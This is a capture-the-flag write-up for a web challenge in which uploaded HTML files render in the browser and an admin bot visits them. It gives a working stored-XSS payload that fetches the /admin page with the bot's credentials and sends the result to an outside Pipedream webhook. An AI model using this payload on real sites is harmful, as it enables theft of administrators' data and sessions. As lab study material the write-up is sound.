### Analysis  
This challenge consists of two pages:  

1. A file upload page that allows us to upload **any file**.  
   ![Upload Page](imgs/image-2.png)  

2. An **admin bot** that visits the URLs we upload.  
   ![Admin Bot](imgs/image-3.png)  

### Finding the Vulnerability  
After testing, I confirmed that if we upload **HTML**, it gets rendered in the browser. This means we can include JavaScript, allowing for **XSS (Cross-Site Scripting)**.  

To test this, I uploaded a simple script that changes the document title:  
```html
<script>
  document.title = "test";
</script>
```
![XSS Test](imgs/image-1.png)  

Since we have access to the **admin panel's source code**, we know where the flag is stored.  

### Exploit  
We can upload a malicious HTML file with this payload:  
```html
<img src=x onerror="fetch('/admin', { credentials: 'include' })
  .then(res => res.json())
  .then(data => { 
    new Image().src = 'https://eo3acfy7jjf8uik.m.pipedream.net/?flag=' + encodeURIComponent(data.trade_plan);
  })">
```
**How it works:**  
- The `src=x` is an **invalid image source**, triggering the `onerror` event.  
- `onerror` executes a `fetch` request to `/admin`, **stealing the admin's session**.  
- The response contains `trade_plan`, which likely holds the **flag**.  
- The script then sends the flag to a **webhook (Pipedream URL)**.  

### Getting the Flag  
Once the admin bot visits our uploaded file, our webhook receives the flag:  
![Webhook Capture](imgs/image.png)  

